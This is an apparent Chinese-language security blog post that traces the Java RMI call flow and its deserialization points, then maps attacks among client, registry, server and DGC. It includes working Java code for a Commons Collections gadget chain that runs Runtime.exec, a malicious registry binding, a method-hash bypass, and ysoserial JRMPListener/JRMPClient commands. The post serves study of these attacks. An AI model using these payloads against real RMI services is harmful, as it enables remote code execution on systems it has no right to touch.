+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220707234315142.png" alt="image-20220707234315142"></p>
+<p>这里有两个可攻击的点，一个是在lookup中的反序列化的点，可通过registry返回恶意类。二是在executeCall中，如果返回值为异常，进入case中会进行反序列化。</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220707235359916.png" alt="image-20220707235359916"></p>
+<p>那么lookup中的反序列化在其他的方法中并不普遍存在，例如bind等方法是没有的，但是这些方法都有invoke的调用，即都有可能进入case中，所以invoke中的反序列化点存在普遍性，利用范围也更大。</p>
+<h2 id="客户端请求注册中心-注册中心端"><a href="#客户端请求注册中心-注册中心端" class="headerlink" title="客户端请求注册中心-注册中心端"></a>客户端请求注册中心-注册中心端</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hello stub &#x3D; (Hello) registry.lookup(&quot;hello&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>在 Registry 端，由  <strong>sun.rmi.transport.tcp.TCPTransport#handleMessages</strong> 来处理请求，调用 <strong>serviceCall</strong> 方法处理。</p>
+<p>断点下到 handleMessages 中</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220708003610868.png" alt="image-20220708003610868"></p>
+<p><strong>serviceCall</strong> 方法中从 ObjectTable 中获取封装的 Target 对象，并获取其中的封装的 UnicastServerRef 以及 RegistryImpl 对象。然后调用 <strong>UnicastServerRef</strong> 的 <strong>dispatch</strong> 方法</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220708004719188.png" alt="image-20220708004719188"></p>
+<p>因为skel不为空，判定为registery，就调用了 <strong>oldDispatch</strong>，这里判断了 this.skel 是否为空，用来区别自己是 Registry 还是 Server。</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220708004910700.png" alt="image-20220708004910700"></p>
+<p>调用 <strong>RegistryImpl_Skel#dispatch</strong></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220708005005512.png" alt="image-20220708005005512"></p>
+<p>RegistryImpl_Skel 的 dispatch 方法根据流中写入的不同的操作类型分发给不同的方法处理，例如 0 代表着 bind 方法，2 代表lookup方法，这里为lookup，通过 <strong>反序列化获取要查找的值</strong>，然后调用 <strong>RegistryImpl#lookup()</strong></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220708005355785.png" alt="image-20220708005355785"></p>
+<p>lookup从bindings中进行get获取</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220708005714253.png" alt="image-20220708005714253"></p>
+<p>这里存在一个反序列化的点，可通过客户端攻击Registry端。</p>
+<p>获取完后返回 <strong>RegistryImpl_Skel#dispatch</strong>，将获取的值序列化传过去</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220711034020673.png" alt="image-20220711034020673"></p>
+<h2 id="客户端请求服务端-客户端"><a href="#客户端请求服务端-客户端" class="headerlink" title="客户端请求服务端-客户端"></a>客户端请求服务端-客户端</h2><p>接下来客户端调用服务端的远程对象</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">stub.sayHello();</span><br></pre></td></tr></table></figure>
+
+<p>因为获取的是动态代理，所以走到 <strong>RemoteObjectInvocationHandler#invoke</strong>，跳过几个if判断后走到 <strong>invokeRemoteMethod</strong></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220708011751752.png" alt="image-20220708011751752"></p>
+<p>在 <strong>invokeRemoteMethod</strong> 中实际是委托 RemoteRef 的子类 <strong>UnicastRef#invoke</strong> 方法执行调用。</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220708011806230.png" alt="image-20220708011806230"></p>
+<p>UnicastRef 的 invoke 方法是一个建立连接，执行调用，并读取结果并反序列化的过程。这里，UnicastRef 包含属性 LiveRef ，LiveRef 类中的 Endpoint、Channel 封装了与网络通信相关的方法。</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220708012504230.png" alt="image-20220708012504230"></p>
+<p>如果方法有参数，调用 <strong>marshalValue</strong> 将参数写入到输出流，然后调用 executeCall</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220708012902061.png" alt="image-20220708012902061"></p>
+<p>executeCall中通过 <strong>releaseOutputStream()</strong> 释放输出流，触发调用。</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220708013740871.png" alt="image-20220708013740871"></p>
+<p>executeCall之后，接受返回的输入流，通过 <strong>unmarshalValue()</strong> 去<strong>反序列化</strong>接受返回值</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220708014057671.png" alt="image-20220708014057671"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220708014156699.png" alt="image-20220708014156699"></p>
+<h2 id="客户端请求服务端-服务端"><a href="#客户端请求服务端-服务端" class="headerlink" title="客户端请求服务端-服务端"></a>客户端请求服务端-服务端</h2><p>依然是 handleMessages 中的 <strong>UnicastServerRef 的 dispatch</strong> ，可以对比着 客户端请求注册中心-注册中心端 来看</p>
+<p>在客户端释放输出流后，服务端通过getInputStream()获取输入流。</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220708020612105.png" alt="image-20220708020612105"></p>
+<p>跳过if，获取method名称，unmarshalValue用来 <strong>反序列化传入的参数</strong></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220708020905650.png" alt="image-20220708020905650"></p>
+<p>接着，在释放输入流后，反射调用</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220708021035368.png" alt="image-20220708021035368"></p>
+<p>服务端再将返回值通过marashalvalue序列化传给客户端</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220708021255995.png" alt="image-20220708021255995"></p>
+<h2 id="DGC"><a href="#DGC" class="headerlink" title="DGC"></a>DGC</h2><p>在远程对象的创建一节，知道了 <strong>服务端</strong> 通过 <strong>ObjecyTable#putTarget</strong> 将注册对象put到objTable中，其中有默认的DGCImpl对象</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220709021230735.png" alt="image-20220709021230735"></p>
+<p>来看一下产生的代码：调用静态变量dgcLog，那么当调用一个类的静态变量的时候是会对类进行类初始化</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220709021506791.png" alt="image-20220709021506791"></p>
+<p>跟进发现静态代码块，使用单例模式创建了一个DGCImpl对象，这个对象就是RMI的分布式垃圾处理对象，一旦有远程对象被创建，就会实例化这个对象，但也只会创建这一次。DGC的创建模式 <strong>类似于注册中心</strong> 的创建也是系统的内置类，所以是直接创建了 <strong>DGCImpl_Stub</strong>类，而不是创建的动态代理。并且设置了disp的skeleton是 <strong>DGCImpl_Skel</strong>。最后同样把这些放进Target，把Target保存进ObjectTable。</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220709021927384.png" alt="image-20220709021927384"></p>
+<p>那么在 <strong>客户端</strong> 进行调用时会不会也同请求注册中心一样，在本地生成一个DGCImpl_Stub？答案为是的。</p>
+<p>在 RegistryImpl_Stub#lookup的ref.done中，在接受服务端的返回值后，通过done的后续调用创建DGCImpl_Stub，并调用了其中的 <strong>DGCImpl_Stub#dirty</strong></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220711030934849.png" alt="image-20220711030934849"></p>
+<p>关注一下dirty函数，两个点 1. invoke触发UnicastRef的execCall从而进入switch反序列化。2.获取输入流，readObject</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220711032112396.png" alt="image-20220711032112396"></p>
+<p>再看一下 <strong>服务端</strong> ，依然是 handleMessages 中的 <strong>UnicastServerRef 的 dispatch</strong> ，skel不为空进入 <strong>oldDispatch</strong> 最后进入<strong>DGCImpl_Skel#dispatch</strong>。两个case语句，一个clean方法基本不会调用，另一个case为dirty部分，两个case中都调用了readObject，存在反序列化攻击点</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220711032934092.png" alt="image-20220711032934092"></p>
+<h1 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h1><p>整体的RMI流程已经基本分析，可以看到不管是Server端，Registry端和Client端都存在反序列化利用的点。其实说白了就跟那排列组合没啥区别。</p>
+<p>1、攻击客户端：</p>
+<blockquote>
+<p>RegistryImpl_Stub#lookup-&gt;注册中心攻击客户端<br>DGCImpl_Stub#dirty-&gt;服务端攻击客户端<br>UnicastRef#invoke-&gt;服务端攻击客户端<br>StreamRemoteCall#executeCall-&gt;服务端/注册中心攻击客户端</p>
+</blockquote>
+<p>2、攻击服务端</p>
+<blockquote>
+<p>UnicastServerRef#dispatch-&gt;客户端攻击服务端<br>DGCImpl_Skel#dispatch-&gt;客户端攻击服务端</p>
+</blockquote>
+<p>3、攻击注册中心</p>
+<blockquote>
+<p>RegistryImpl_Skel#dispatch-&gt;客户端/服务端攻击注册中心</p>
+</blockquote>
+<h1 id="攻击实现"><a href="#攻击实现" class="headerlink" title="攻击实现"></a>攻击实现</h1><p>大佬总结图</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200701101308-6810e0aa-bb40-1.png"></p>
+<h2 id="客户端攻击服务端"><a href="#客户端攻击服务端" class="headerlink" title="客户端攻击服务端"></a>客户端攻击服务端</h2><p>服务端的UnicastServerRef#dispatch调用了unmarshalValue。如果服务端就收的是object，那么客户端把参数设置成payload就能攻击了。如果是其他类型下面再讨论</p>
+<p>Server端定义接受Object</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Hello</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function">String <span class="title">sayHello</span><span class="params">(Object name)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Client</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//获取注册中心</span></span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        Hello stub = (Hello) registry.lookup(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        stub.sayHello(getpayload());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getpayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map&lt;Object, Object&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="comment">//Map lazymap = LazyMap.decorate(map, chainedTransformer);</span></span><br><span class="line">        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map, <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(lazymap,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; hashmap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        hashmap.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        lazymap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Class c = LazyMap.class;</span><br><span class="line">        Field factory = c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        factory.set(lazymap,chainedTransformer);</span><br><span class="line">        <span class="keyword">return</span> hashmap;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果服务端接受的类型为String，那么在服务端就会找不到对应的调用方法，这个对应方法，是在 UnicastServerRef 的 dispatch 方法中在 this.hashToMethod_Map 中通过 Method 的 hash 来查找的。这个 hash 实际上是一个基于方法签名的 SHA1 hash 值。</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220711045646059.png" alt="image-20220711045646059"></p>
+<p>在客户端的 RemoteObjectInvocationHandler#invokeRemoteMethod 是计算method的hash地方，我们可以下断点到这里，然后在计算hash之前修改method的值为String</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">methos&#x3D;ClassLoader.getSystemClassLoader().loadClass(&quot;org.example.IRemoteObj&quot;).getDeclaredMethod(&quot;sayHello&quot;,String.class)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220711050329226.png" alt="image-20220711050329226"></p>
+<p>或者重写invoke</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        RegistryImpl_Stub registry = (RegistryImpl_Stub) LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        IRemoteObj remoteObj = (IRemoteObj) registry.lookup(<span class="string">&quot;remoteObj&quot;</span>);</span><br><span class="line"><span class="comment">//        HashMap evilMap = genEvilMap();</span></span><br><span class="line"><span class="comment">//        remoteObj.sayHello(evilMap);</span></span><br><span class="line">        invoke(remoteObj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">invoke</span><span class="params">(IRemoteObj remoteObj)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Field hField = remoteObj.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;h&quot;</span>);</span><br><span class="line">        hField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object remoteObjectInvocationHandler = hField.get(remoteObj);</span><br><span class="line"></span><br><span class="line">        Field refField = remoteObjectInvocationHandler.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;ref&quot;</span>);</span><br><span class="line">        refField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        UnicastRef ref = (UnicastRef) refField.get(remoteObjectInvocationHandler);</span><br><span class="line"></span><br><span class="line">        Method method = IRemoteObj.class.getDeclaredMethod(<span class="string">&quot;sayHello&quot;</span>, String.class);</span><br><span class="line"></span><br><span class="line">        Method methodToHash_mapsMethod = remoteObjectInvocationHandler.getClass().getDeclaredMethod(<span class="string">&quot;getMethodHash&quot;</span>,Method.class);</span><br><span class="line">        methodToHash_mapsMethod.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">long</span> hash = (<span class="keyword">long</span>) methodToHash_mapsMethod.invoke(remoteObj, method);</span><br><span class="line"></span><br><span class="line">        ref.invoke(remoteObj, method, <span class="keyword">new</span> Object[]&#123;genEvilMap()&#125;, hash);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="注册中心攻击客户端"><a href="#注册中心攻击客户端" class="headerlink" title="注册中心攻击客户端"></a>注册中心攻击客户端</h2><p>客户端通过调用lookup，list等，会反序列化从注册中心发送的东西，注册中心只要绑定一个恶意的对象即可</p>
+<p>Server</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Server</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> RemoteHelloworld();</span><br><span class="line">        Remote Evil = <span class="keyword">new</span> Evil();</span><br><span class="line">        Registry r = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        r.bind(<span class="string">&quot;hello&quot;</span>,Evil);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Evil.java</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span> <span class="keyword">implements</span> <span class="title">Remote</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Map map;</span><br><span class="line"></span><br><span class="line">    Evil() <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">this</span>.map = getpayload();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map&lt;Object, Object&gt; <span class="title">getpayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map&lt;Object, Object&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="comment">//Map lazymap = LazyMap.decorate(map, chainedTransformer);</span></span><br><span class="line">        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map, <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(lazymap,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; hashmap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        hashmap.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        lazymap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Class c = LazyMap.class;</span><br><span class="line">        Field factory = c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        factory.set(lazymap,chainedTransformer);</span><br><span class="line">        <span class="keyword">return</span> hashmap;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="攻击JRMP客户端"><a href="#攻击JRMP客户端" class="headerlink" title="攻击JRMP客户端"></a>攻击JRMP客户端</h2><p>只要客户端的stub发起JRMP请求，就会调用UnicastRef#invoke，也就会调用StreamRemoteCall#executeCall，导致被反序列化攻击。这里想实现攻击需要自己实现一个恶意服务端，把返回的异常信息改成payload，这里利用ysoserial里面的exploit/JRMPListener，去起一个假的Server</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 calc.exe</span><br></pre></td></tr></table></figure>
+
+<h2 id="DGC攻击服务端"><a href="#DGC攻击服务端" class="headerlink" title="DGC攻击服务端"></a>DGC攻击服务端</h2><p>这块有点复杂。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPClient 127.0.0.1 1099 CommonsCollections6 calc.exe</span><br></pre></td></tr></table></figure>
+
+<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>简单了解了一下RMI的流程以及攻击面，其中细节以及攻击的实现，以及后续的jdk修复以及绕过等等还有很多要学习，但是深感自身的不足，能力有限。</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://su18.org/post/rmi-attack/">Java RMI 攻击由浅入深 | 素十八</a></p>
+<p><a target="_blank" rel="noopener" href="https://halfblue.github.io/2021/10/26/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E4%B8%89%E9%A1%BE%E8%8C%85%E5%BA%90-%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/">RMI反序列化漏洞之三顾茅庐-流程分析 | Halfblue</a></p>
+<p><a target="_blank" rel="noopener" href="https://halfblue.github.io/2021/11/02/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E4%B8%89%E9%A1%BE%E8%8C%85%E5%BA%90-%E6%94%BB%E5%87%BB%E5%AE%9E%E7%8E%B0/">RMI反序列化漏洞之三顾茅庐-攻击实现 | Halfblue</a></p>
+<p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1430/#toc__3">JAVA 协议安全笔记-RMI篇</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7930#toc-14">针对RMI服务的九重攻击上</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/M_-lWKb9xO6u2MxRaEQ--Q">【技术干货】RMI-攻击方式总结</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/257452#h2-0">RMI-攻击方式总结</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/12/25/mysql/" rel="prev" title="mysql注入">
+                  <i class="fa fa-angle-left"></i> mysql注入
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/12/25/PHP%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97RCE/" rel="next" title="PHP无字母数字RCE">
+                  PHP无字母数字RCE <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Y0ng</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
